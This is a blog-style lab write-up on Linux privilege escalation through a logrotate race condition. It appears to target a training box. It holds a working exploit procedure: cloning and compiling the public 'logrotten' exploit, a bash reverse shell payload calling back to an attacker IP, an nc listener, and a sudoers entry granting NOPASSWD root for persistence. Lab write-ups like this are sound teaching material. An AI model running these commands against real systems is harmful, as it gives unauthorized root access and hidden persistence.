---
title: "Linux PrivEsc with Logrotate"
data: 2024-06-03 00:00:00 +0800
categories: [LINUX PRIVILEGE ESCALATION]
tags: [linux , privilege escalation]
author: d5fa4lt
image: /assets/privilege-escalation.jpg
---

## overview

log files can be very large and take the entire disk space. To prevent this and save disk space, `logrotate` has been developed. this tool is doing log rotation. 

## *What Is Log Rotation?*

log rotation is the process of controlling the size of log file. when a log file reaches a threshold like: maximum size, age, or number of records. `logrotate` will rename it and then a new file with the original name. then continue writing to the new file. 

let's say we have a file called `mylog.log` and it reaches maximum size. `logrotate` will rename it to `mylog.log.1` and create a new file called `mylog.log`. then continue to record in the new file.

A common naming style 

1. adding timestamp 
2. adding suffixes

### adding timestamp 

for example we have a log file named `mylogfile.log` so the older files will be `mylogfile_20220429.log`, `mylogfile_20220430.log` 

### adding suffixes

for example we have a log file named `ERRORLOG` so the older files will be `ERRORLOG.1`, `ERRORLOG.2`

> the older files will be deleted, compressed or archived
{: .prompt-info } 

## privilege escalation
we can exploit this feature and execute a payload in the target system using this exploit [https://github.com/whotwagner/logrotten](https://github.com/whotwagner/logrotten)

but there is some requirements  
1. we need `write` permissions on the log files
2. `logrotate` must run as a privileged user or `root`
3. vulnerable versions:
    - 3.8.6
    - 3.11.0
    - 3.15.0
    - 3.18.0


### exploitation

first i will check it version of `logrotate`

```shell
logrotate --version

logrotate 3.11.0
```

download the exploit from the `github` repository and compile it. it's better to compile it in the target system because if you compile it in your machine sometime it cause errors.   

to compile the exploit  
```shell
git clone https://github.com/whotwagner/logrotten.git
cd logrotten
gcc logrotten.c -o logrotten
```

next we need a payload to be executed. in this case i use a reverse shell payload 
```shell
echo 'bash -i >& /dev/tcp/10.10.15.10/9001 0>&1' > payload
```

start a listener
```shell
nc -nlvp 9001
```

before we execute the exploit we need to know what is the option the `logrotate` uses in `logrotate.conf` file 

	create : create a new file and rename the older on
	compress : compress the older files

```shell
cat /etc/logrotate.conf


# see "man logrotate" for details

# global options do not affect preceding include directives

# rotate log files weekly
weekly

# use the adm group by default, since this is the owning group
# of /var/log/syslog.
su root adm

# keep 4 weeks worth of backlogs
rotate 4

# create new (empty) log files after rotating old ones
create

# use date as a suffix of the rotated file
#dateext

# uncomment this if you want your log files compressed
#compress

# packages drop log rotation information into this directory
include /etc/logrotate.d

# system-specific logs may also be configured here.
```

as the exploit documentation says 

If "create"-option is set in `logrotate` configuration file :

```
./logrotten -p ./payloadfile /tmp/log/pwnme.log
```

If "compress"-option is set in `logrotate` configuration file :

```
./logrotten -p ./payloadfile -c -s 4 /tmp/log/pwnme.log
```

so new we need to get the target log file 

we see there is a backup file named `backup` and has `access.log` and `access.log.1`. 

![backup](/assets/logsfiles.png)

let's check if we have a write permission on the `access.log`

![privcheck](/assets/privcheck.png)

we have a write permission on the file. but the interesting thing that we trigger `logrotate`. 

access.log.1 renamed to access.log.2

access.log renamed to access.log.1

a new file created named access.log

![trigger](/assets/trigger.png)

i execute the exploit 
```
./logrotten -p ./payload /home/htb-student/backups/access.log


Waiting for rotating /home/htb-student/backups/access.log...
Renamed /home/htb-student/backups with /home/htb-student/backups2 and created symlink to /etc/bash_completion.d
Waiting 1 seconds before writing payload...

```

and in another ssh session i trigger `logrotate`

```sh
echo 'testing' > access.log
```

and i get a shell 
![rootshell](/assets/rootshell.png)
but i have a problem, the reverse shell dies quickly. so when get a reverse shell quickly i run this command 
```shell
echo "htb-student ALL=(ALL) NOPASSWD:ALL" | sudo tee /etc/sudoers.d/htb-student

```
![roouser](/assets/rootuser.png)

That’s all for today. Thanks for reading !!!